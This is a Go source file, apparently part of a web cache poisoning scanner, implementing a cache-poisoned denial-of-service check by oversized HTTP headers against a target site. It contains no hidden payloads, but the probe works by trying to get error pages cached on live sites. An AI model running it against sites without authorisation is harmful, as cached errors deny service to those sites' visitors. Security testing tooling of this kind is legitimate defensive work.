package cpdos

import (
	"github.com/projectdiscovery/gologger"
	"github.com/wealeson1/wcpvs/internal/logic/tecniques"
	"github.com/wealeson1/wcpvs/internal/models"
	"github.com/wealeson1/wcpvs/pkg/utils"
	"io"
	"net/http"
	"strings"
	"time"
)

type HHO struct {
	payload string
}

var HHOTecnique *HHO

func init() {
	HHOTecnique = NewHHO()
}

func NewHHO() *HHO {
	payload := utils.RandomString(20480)
	return &HHO{
		payload: payload,
	}
}

func (h *HHO) Scan(target *models.TargetStruct) {
	headerSize := 8192
	mixSize := 40960

	for headerSize <= mixSize {
		if !target.Cache.NoCache {
			randomHeader := utils.RandomString(5)
			resp, err := tecniques.GetRespNoPayload(target, tecniques.HEADER, map[string]string{randomHeader: utils.RandomString(headerSize)})
			if err != nil {
				gologger.Error().Msg(err.Error())
				return
			}
			respBodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				gologger.Error().Msg(err.Error())
				return
			}
			utils.CloseReader(resp.Body)

			// 华为云的特殊案例
			if (resp.StatusCode != target.Response.StatusCode) || (resp.StatusCode == http.StatusBadRequest && strings.Contains(string(respBodyBytes), "Too Large")) {
				for range 3 {
					time.Sleep(400 * time.Millisecond)
					tmpReq, err := utils.CloneRequest(resp.Request)
					if err != nil {
						gologger.Error().Msgf("HHO.Scan:%s", err.Error())
						return
					}

					// 情况，偶尔一次的错误会导致状态码异常，但是又不是Payload造成的异常
					// 第二次循环的时候又正常了，并且正常的页面是有缓存机制的，就判定存在漏洞了
					// 预防：响应异常状态码的时候判断下是否存在缓存机制，如果不存在，就继续测试
					//tmpTarget := &models.TargetStruct{
					//	Response: resp,
					//	Cache:    &models.CacheStruct{},
					//}
					//hasCache, _ := logic.Checker.IsCacheAvailable(tmpTarget)
					//if !hasCache {
					//	continue
					//}
					hasCustomHeaders, _ := utils.HasCustomHeaders(resp)
					if !hasCustomHeaders {
						continue
					}

					resp2, err := utils.CommonClient.Do(tmpReq)
					if err != nil {
						gologger.Error().Msgf("HHO.Scan:%s", err.Error())
						return
					}
					if utils.IsCacheHit(target, &resp2.Header) && target.Response.StatusCode != resp2.StatusCode {
						gologger.Info().Msgf("The target %s has a CPDOS vulnerability, detected using HHO. Test: AAAAA...%d.", target.Request.URL, headerSize)
						return
					}
					utils.CloseReader(resp.Body)
				}
				return
			}
		}
		headerSize = headerSize + 1024
	}

}
